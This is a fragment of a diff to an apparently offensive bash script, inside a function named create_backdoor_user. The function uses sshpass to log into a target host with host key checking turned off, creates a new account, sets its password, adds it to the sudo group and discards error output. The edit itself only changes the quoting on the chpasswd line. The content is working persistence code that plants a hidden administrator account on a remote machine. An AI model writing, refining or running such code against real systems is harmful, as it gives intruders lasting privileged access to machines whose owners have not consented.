@@ -82,7 +82,7 @@ create_backdoor_user() {
     echo -e "${YELLOW}[*] Adding user $backdoor_user...${NC}"
     sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no "$USERNAME@$TARGET" "
         sudo useradd -m -s /bin/bash $backdoor_user &&
-        echo '$backdoor_user:$backdoor_pass' | sudo chpasswd &&
+        echo \"$backdoor_user:$backdoor_pass\" | sudo chpasswd &&
         sudo usermod -aG sudo $backdoor_user
     " 2>/dev/null
     
